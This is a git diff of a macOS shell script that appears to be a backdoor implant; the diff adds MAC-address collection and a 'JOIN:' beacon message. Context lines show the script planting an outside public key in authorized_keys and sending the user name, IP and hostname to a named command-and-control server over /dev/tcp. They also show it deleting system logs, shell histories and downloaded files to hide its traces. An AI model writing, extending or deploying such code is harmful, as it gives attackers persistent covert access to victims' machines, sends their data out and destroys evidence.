@@ -17,13 +17,15 @@ curl -so "$SSHPATH/authorized_keys" https://erikboesen.com/pubkey
 USER=`stat -f "%Su" /dev/console` # Get user currently logged in (in GUI).
 IP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
 HOSTNAME=`hostname`
+# TODO: Check that this works
+MAC=`ifconfig en1 | awk '/ether/{print $2}'`
 
 SERVER="boesen.science"
 PORT=2043
 
 # Send data to C&C
-exec 3<>/dev/tcp/${SERVER}/${PORT}
-printf "${USER} ${IP} ${HOSTNAME}" >&3
+exec 3<>/dev/tcp/$SERVER/$PORT
+printf "JOIN: $USER $IP $HOSTNAME $MAC" >&3
 
 # Print response
 # TODO: If there's no response, we should send data in some other way
@@ -36,7 +38,7 @@ rm -f /tmp/elevate.out /tmp/*.sh
 rm -rf /var/log/*
 rm -f /var/root/.*history /Users/*/.*history
 
-rm -f "/Users/${USER}/Downloads/term.*"
+rm -f "/Users/$USER/Downloads/term.*"
 
 if [ "$USER" != "boesene" ]; then
     killall term
